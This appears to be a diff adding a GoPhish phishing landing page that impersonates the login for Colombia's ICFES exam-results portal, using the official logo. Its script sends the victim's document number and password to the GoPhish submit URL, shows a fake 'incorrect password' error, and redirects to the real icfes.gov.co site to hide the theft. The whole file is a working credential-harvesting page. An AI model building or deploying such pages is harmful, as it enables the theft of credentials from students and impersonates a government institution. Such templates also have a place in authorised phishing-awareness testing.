@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <base href="https://jakala11.github.io/landing-page/"/>
+    <meta charset="UTF-8"/>
+    <title>ICFES - Consulta de Resultados</title>
+    <style type="text/css">
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #e9eef3;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            width: 400px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 180px;
+        }
+        h2 {
+            text-align: center;
+            color: #003366;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+        input[type="submit"] {
+            width: 100%;
+            padding: 12px;
+            background-color: #003366;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        input[type="submit"]:hover {
+            background-color: #0059b3;
+        }
+        .note {
+            text-align: center;
+            font-size: 0.9em;
+            color: #555;
+            margin-top: 15px;
+        }
+        .error {
+            color: red;
+            font-size: 0.9em;
+            text-align: center;
+            margin-top: 15px;
+        }
+    </style>
+    <script>
+        // Captura el evento del envío del formulario y muestra un error falso
+        function mostrarError(event) {
+            event.preventDefault(); // Evita el comportamiento por defecto (enviar el formulario)
+
+            // Envía los datos al servidor de GoPhish
+            const form = event.target;
+            const formData = new FormData(form);
+            fetch(form.action, {  // Se envían los datos al servidor configurado (GoPhish)
+                method: "POST",
+                body: formData
+            });
+
+            // Muestra el mensaje de error y redirige después de 3 segundos
+            document.getElementById('formulario').style.display = 'none';
+            document.getElementById('mensaje-error').style.display = 'block';
+
+            // Redirige después de 3 segundos al sitio real
+            setTimeout(() => {
+                window.location.href = "https://www.icfes.gov.co";
+            }, 3000);
+        }
+    </script>
+</head>
+<body>
+<div class="container">
+    <div class="logo">
+        <img alt="Logo ICFES" src="https://www.icfes.gov.co/documents/20143/0/logo-icfes-2021-color.png"/>
+    </div>
+
+    <h2>Consulta de Resultados</h2>
+
+    <!-- Formulario con acción para enviar datos a GoPhish -->
+    <form action="{{.SubmitURL}}" method="POST" id="formulario" onsubmit="mostrarError(event)">
+        <!-- Campos ocultos si es necesario -->
+        <input type="hidden" name="url" value="https://jakala11.github.io/landing-page/" />
+        
+        <label for="usuario">Tipo de documento y número</label>
+        <input id="usuario" name="usuario" type="text" placeholder="CC 1234567890" required=""/>
+        
+        <label for="clave">Contraseña</label>
+        <input id="clave" name="clave" placeholder="********" required="" type="password"/>
+        
+        <input type="submit" value="Consultar"/>
+    </form>
+
+    <div class="error" id="mensaje-error" style="display:none;">Usuario o contraseña incorrectos. Redirigiendo al portal oficial...</div>
+
+    <div class="note">¿Problemas para ingresar? Contacte soporte@icfes.gov.co</div>
+</div>
+
+</body>
+</html>
